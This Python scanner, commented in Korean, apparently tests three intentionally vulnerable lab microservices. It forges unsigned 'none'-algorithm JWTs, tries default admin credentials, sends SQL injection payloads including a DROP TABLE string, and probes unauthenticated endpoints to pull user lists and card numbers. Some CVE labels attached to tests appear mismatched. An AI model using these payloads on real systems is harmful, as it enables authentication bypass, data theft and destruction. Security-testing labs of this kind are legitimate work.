"""
취약점 자동 스캐너
HTTP 요청 기반으로 취약 마이크로서비스 3개를 테스트한다.
"""
from __future__ import annotations
import os
import time
import base64
import json
import requests

# 기본 타임아웃 (초)
TIMEOUT = 3

TARGETS = {
    "user-api":    os.environ.get("SCANNER_USER_API",    "http://user-api:3001"),
    "product-api": os.environ.get("SCANNER_PRODUCT_API", "http://product-api:3002"),
    "payment-api": os.environ.get("SCANNER_PAYMENT_API", "http://payment-api:3003"),
}


# ── 공통 유틸 ─────────────────────────────────────────────────────────────────

def _safe_get(url: str, **kwargs) -> requests.Response | None:
    try:
        return requests.get(url, timeout=TIMEOUT, **kwargs)
    except Exception:
        return None


def _safe_post(url: str, **kwargs) -> requests.Response | None:
    try:
        return requests.post(url, timeout=TIMEOUT, **kwargs)
    except Exception:
        return None


def _make_none_jwt(payload: dict) -> str:
    """none 알고리즘 JWT 수동 생성 (서명 없음)."""
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    body = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{body}."  # 서명 부분 비어있음


# ── 개별 테스트 ───────────────────────────────────────────────────────────────

def test_jwt_weak_secret(base_url: str) -> dict:
    """
    JWT weak secret 테스트:
    1. 정상 로그인 → 토큰 획득
    2. 토큰 구조 분석 (weak secret 여부 힌트)
    """
    result = {
        "test": "JWT Weak Secret",
        "cve": "CVE-2021-23440",
        "passed": False,
        "detail": "",
        "severity": 1,
    }

    resp = _safe_post(f"{base_url}/api/v1/login", json={"username": "admin", "password": "admin123"})
    if not resp or resp.status_code != 200:
        result["detail"] = "로그인 불가 (서비스 미응답)"
        return result

    token = resp.json().get("token", "")
    if token:
        parts = token.split(".")
        if len(parts) == 3:
            try:
                header_raw = parts[0] + "=" * (-len(parts[0]) % 4)
                header = json.loads(base64.urlsafe_b64decode(header_raw))
                alg = header.get("alg", "")
                result["passed"] = True
                result["detail"] = (
                    f"토큰 발급 성공. 알고리즘: {alg}. "
                    "기본 자격증명(admin/admin123)으로 로그인 가능 → weak credential 확인."
                )
                result["token_preview"] = token[:60] + "..."
            except Exception as e:
                result["detail"] = f"토큰 파싱 실패: {e}"
    return result


def test_jwt_none_algorithm(base_url: str) -> dict:
    """
    JWT none 알고리즘 우회 테스트:
    서명 없는 none 알고리즘 토큰으로 보호된 엔드포인트 접근 시도.
    """
    result = {
        "test": "JWT None Algorithm Bypass",
        "cve": "CVE-2022-23529",
        "passed": False,
        "detail": "",
        "severity": 1,
    }

    fake_token = _make_none_jwt({"user_id": 1, "username": "admin", "role": "admin"})
    resp = _safe_get(
        f"{base_url}/api/v1/profile/1",
        headers={"Authorization": f"Bearer {fake_token}"},
    )

    if resp and resp.status_code == 200:
        result["passed"] = True
        result["detail"] = "⚠️  서명 없는 none 알고리즘 JWT로 인증 우회 성공! 응답: " + str(resp.json())
    elif resp:
        result["detail"] = f"우회 실패 (HTTP {resp.status_code}) - none 알고리즘 차단됨"
    else:
        result["detail"] = "서비스 응답 없음"

    result["payload_used"] = fake_token[:80] + "..."
    return result


def test_sql_injection(base_url: str) -> dict:
    """
    SQL 인젝션 테스트:
    기본 페이로드로 쿼리 조작 시도.
    """
    result = {
        "test": "SQL Injection",
        "cve": "CVE-2021-23639",
        "passed": False,
        "detail": "",
        "severity": 1,
    }

    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE products--",
    ]

    for payload in payloads:
        resp = _safe_get(f"{base_url}/api/v1/products/search", params={"q": payload})
        if not resp:
            continue

        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, list) and len(data) > 0:
                result["passed"] = True
                result["detail"] = (
                    f"페이로드 '{payload}'로 {len(data)}개 레코드 반환. "
                    "SQL 인젝션으로 전체 테이블 덤프 가능."
                )
                result["payload_used"] = payload
                break
        elif resp.status_code == 500:
            body = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
            if "query" in body or "error" in body:
                result["passed"] = True
                result["detail"] = f"SQL 에러와 쿼리 내용 노출: {str(body)[:200]}"
                result["payload_used"] = payload
                break

    if not result["passed"]:
        result["detail"] = "SQL 인젝션 테스트 페이로드가 차단됨 (또는 서비스 미응답)"

    return result


def test_bfla_internal_endpoint(base_url: str) -> dict:
    """
    BFLA (Broken Function Level Authorization) 테스트:
    /internal/ 엔드포인트에 인증 없이 외부 접근 시도.
    """
    result = {
        "test": "BFLA - Unprotected Internal Endpoint",
        "cve": "OWASP API5:2023",
        "passed": False,
        "detail": "",
        "severity": 1,
    }

    resp = _safe_get(f"{base_url}/internal/pricing/1")
    if resp and resp.status_code == 200:
        data = resp.json()
        result["passed"] = True
        result["detail"] = (
            f"/internal/pricing/1 에 인증 없이 접근 성공. "
            f"내부 프로모코드 노출: {data.get('promo_code', '')}. 전체 응답: {data}"
        )
    elif resp:
        result["detail"] = f"접근 차단됨 (HTTP {resp.status_code})"
    else:
        result["detail"] = "서비스 응답 없음"

    return result


def test_sensitive_data_exposure(base_url: str) -> dict:
    """
    민감 데이터 노출 테스트:
    인증 없이 카드번호 포함 결제 내역 조회 시도.
    """
    result = {
        "test": "Sensitive Data Exposure (Card Numbers)",
        "cve": "OWASP API3:2023",
        "passed": False,
        "detail": "",
        "severity": 1,
    }

    resp = _safe_get(f"{base_url}/api/v1/payments")
    if resp and resp.status_code == 200:
        data = resp.json()
        card_numbers = [item.get("card_number") for item in data if item.get("card_number")]
        if card_numbers:
            result["passed"] = True
            result["detail"] = (
                f"인증 없이 {len(data)}건 결제 내역 접근 성공. "
                f"카드번호 노출: {card_numbers}"
            )
        else:
            result["detail"] = "결제 내역 조회 성공했으나 카드번호 미포함"
    elif resp:
        result["detail"] = f"접근 차단됨 (HTTP {resp.status_code})"
    else:
        result["detail"] = "서비스 응답 없음"

    return result


def test_bola_user_list(base_url: str) -> dict:
    """
    BOLA 테스트:
    인증 없이 전체 사용자 목록 조회 시도.
    """
    result = {
        "test": "BOLA - Unauthorized User List Access",
        "cve": "OWASP API1:2023",
        "passed": False,
        "detail": "",
        "severity": 1,
    }

    resp = _safe_get(f"{base_url}/api/v1/users")
    if resp and resp.status_code == 200:
        data = resp.json()
        result["passed"] = True
        result["detail"] = (
            f"인증 없이 {len(data)}명 사용자 정보 접근 성공. "
            f"사용자 목록: {[u.get('username') for u in data]}"
        )
    elif resp:
        result["detail"] = f"접근 차단됨 (HTTP {resp.status_code})"
    else:
        result["detail"] = "서비스 응답 없음"

    return result


# ── 메인 스캐너 ───────────────────────────────────────────────────────────────

def run_scan(targets: dict[str, str] | None = None) -> dict:
    """
    모든 취약점 테스트를 실행하고 결과를 반환.

    Returns:
        {
          "scan_time": str,
          "results": { "user-api": [...], "product-api": [...], "payment-api": [...] },
          "summary": { "total": int, "found": int, "critical": int }
        }
    """
    if targets is None:
        targets = TARGETS

    scan_start = time.time()
    results: dict[str, list[dict]] = {}

    # user-api 스캔
    ua = targets.get("user-api", "")
    if ua:
        results["user-api"] = [
            test_jwt_weak_secret(ua),
            test_jwt_none_algorithm(ua),
            test_bola_user_list(ua),
        ]

    # product-api 스캔
    pa = targets.get("product-api", "")
    if pa:
        results["product-api"] = [
            test_sql_injection(pa),
        ]

    # payment-api 스캔
    pmt = targets.get("payment-api", "")
    if pmt:
        results["payment-api"] = [
            test_bfla_internal_endpoint(pmt),
            test_sensitive_data_exposure(pmt),
        ]

    # 요약
    all_tests = [t for tests in results.values() for t in tests]
    found = [t for t in all_tests if t["passed"]]
    critical = [t for t in found if t["severity"] == 1]

    return {
        "scan_duration_sec": round(time.time() - scan_start, 2),
        "scan_time": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "results": results,
        "summary": {
            "total_tests": len(all_tests),
            "vulnerabilities_found": len(found),
            "critical": len(critical),
            "by_api": {api: len([t for t in tests if t["passed"]]) for api, tests in results.items()},
        },
    }
